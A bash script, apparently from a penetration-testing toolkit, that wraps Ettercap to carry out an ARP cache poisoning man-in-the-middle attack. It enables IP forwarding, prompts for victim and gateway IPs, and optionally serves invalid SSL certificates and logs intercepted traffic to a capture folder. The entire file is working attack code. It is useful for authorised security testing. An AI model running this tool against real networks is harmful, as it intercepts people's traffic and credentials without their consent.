#!/bin/bash
# Ettercap ARP cache poison script
clear

#this block controls the features for px_interface_selector
include_monitor=0
include_airbase=0
require_ip=1
message="sniff/poison on"
. /opt/pwnix/pwnpad-scripts/px_functions.sh

f_banner(){
  printf "\nEttercap-NG 0.8.0 ARP Cache Poison Tool\n\n"
  printf "[!] Use on networks you are connected to!\n\n"
}

f_sslfake(){
  printf "\nWould you like to use the Invalid SSL Cert option?\n\n"
  printf "Good for testing user policy to make sure users aren't accepting bad certs!\n\n"
  printf "NOTE: if using SSLstrip with Ettercap this is unnecessary\n\n"
  printf "1. Yes\n"
  printf "2. No\n\n"
  sslfakecert=$(f_one_or_two)
}

f_logging(){
  clear
  printf "\nWould you like to log data?\n\n"
  printf "Captures saved to /opt/pwnix/captures/ettercap/\n\n"
  printf "1. Yes\n"
  printf "2. No\n\n"

  logchoice=$(f_one_or_two)
}

f_generate_filename(){
  printf "/opt/pwnix/captures/ettercap/ettercap$(date +%F-%H%M)\n"
}

f_run(){
  printf 1 > /proc/sys/net/ipv4/ip_forward

  filename=$(f_generate_filename)

  clear
  printf "\n"
  read -p "Enter target IP to ARP cache poison: " target1
  printf "\n"

  clear
  printf "\n"
  read -p "Enter target IP of gateway/router: " gw
  printf "\n"

  #ettercap fails if the interface is down
  ip link set $interface up

  if [ $logchoice -eq 1 ]; then
    if [ $sslfakecert -eq 1 ]; then
      ettercap -i $interface -T -q -l $filename -M arp:remote /$gw/ /$target1/
    else
      ettercap -i $interface -T -S -q -l $filename -M arp:remote /$gw/ /$target1/
    fi
  else
    if [ $sslfakecert -eq 1 ]; then
      ettercap -i $interface -T -q -M arp:remote /$gw/ /$target1/
    else
      ettercap -i $interface -T -S -q -M arp:remote /$gw/ /$target1/
    fi
  fi
}

f_banner
f_interface
f_sslfake
f_logging
f_run
